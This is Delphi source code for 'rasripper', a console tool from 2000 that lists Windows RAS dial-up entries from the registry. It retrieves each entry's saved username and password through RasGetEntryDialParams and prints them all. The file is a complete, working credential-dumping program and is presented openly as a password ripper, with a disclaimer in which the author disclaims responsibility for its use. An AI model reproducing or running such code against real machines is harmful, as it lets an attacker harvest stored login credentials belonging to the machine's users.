{ rasripper.dpr - RAS Password ripper - Sigma <sigma@mail.com> (28/04/2000)
  See Readme.txt for more info }

{$APPTYPE CONSOLE}
program rasripper;

uses Windows, Classes, SysUtils, Consts, Registry;

const
{ These are from lmcons.h }
DNLEN            = 15;  // Maximum domain name length
UNLEN            = 256; // Maximum user name length
PWLEN            = 256; // Maximum password length
NETBIOS_NAME_LEN = 16;  // NetBIOS net name (bytes)
RAS_MaxDeviceType     = 16;
RAS_MaxPhoneNumber    = 128;
RAS_MaxIpAddress      = 15;
RAS_MaxIpxAddress     = 21;
RAS_MaxEntryName      = 256;
RAS_MaxDeviceName     = 128;
RAS_MaxCallbackNumber = RAS_MaxPhoneNumber;

type
TRasDialParamsA  = record
    dwSize           : LongInt;
    szEntryName      : Array[0..RAS_MaxEntryName] of AnsiChar;
    szPhoneNumber    : Array[0..RAS_MaxPhoneNumber] of AnsiChar;
    szCallbackNumber : Array[0..RAS_MaxCallbackNumber] of AnsiChar;
    szUserName       : Array[0..UNLEN] of AnsiChar;
    szPassword       : Array[0..PWLEN] of AnsiChar;
    szDomain         : Array[0..DNLEN] of AnsiChar;
end;
TRasDialParams  = TRasDialParamsA;


function RasGetEntryDialParams(lpszPhoneBook: PAnsiChar; var lpDialParams: TRasDialParams; var lpfPassword: LongBool): Longint;  stdcall; forward;
function RasGetEntryDialParams;    external 'rasapi32.dll' name 'RasGetEntryDialParamsA';

function GetEntryUserName(entry : String) : string; // gets user name - duh !
var
  Fp         : LongBool;
  R          : Integer;
  DialParams : TRasDialParams;
begin
  FillChar(DialParams, SizeOf(TRasDialParams), 0);
  with DialParams do
  begin
    dwSize:=Sizeof(TRasDialParams);
    StrPCopy(szEntryName, entry);
  end;
  R:=RasGetEntryDialParams(nil, DialParams, Fp);
  if R=0 then
  with DialParams do
  begin
    Result:=szUserName;
  end;
end;

function GetEntryPassword(entry : String) : string; // gets password - duh !
var
  Fp         : LongBool;
  R          : Integer;
  DialParams : TRasDialParams;
begin
  FillChar(DialParams, SizeOf(TRasDialParams), 0);
  with DialParams do
  begin
    dwSize:=Sizeof(TRasDialParams);
    StrPCopy(szEntryName, entry);
  end;
  R:=RasGetEntryDialParams(nil, DialParams, Fp);
  if R=0 then
  with DialParams do
  begin
    if Fp then
      Result:=szPassword else Result:='';
  end;
end;

var val :string;
    thereg : TRegistry;
    stringlist : TStringlist;
    x : integer;

begin

     Writeln;
     Writeln('+---------------------------------------------------------------------+');
     Writeln('| RAS Dialup account password/username ripper                         |');
     Writeln('| By: Sigma <sigma@mail.com>                                          |');
     Writeln('| DISCLAIMER:                                                         |');
     Writeln('| I accept no responsablilty for the use of this program.             |');
     Writeln('| If you get yourself in trouble with this program, its not my fault. |');
     Writeln('+---------------------------------------------------------------------+');
     Writeln;
     Writeln('RAS entry:Username:Password');
     Writeln('---------------------------');

    stringlist := TStringlist.Create;
    thereg := TRegistry.Create;

    if  thereg.Openkey('\RemoteAccess\Profile',false) then
       thereg.GetKeyNames(stringlist)				// Get RAS entry names from registry
    else
    writeln('Error opening registry key');

    for x := 0 to stringlist.Count-1 do // Print out the RAS entry, its username and password
    begin
        write(stringlist.Strings[x],':');
        write(GetEntryUsername(stringlist.Strings[x]),':');
        write(GetEntryPassword(stringlist.Strings[x]));
        writeln;
    end;
end.
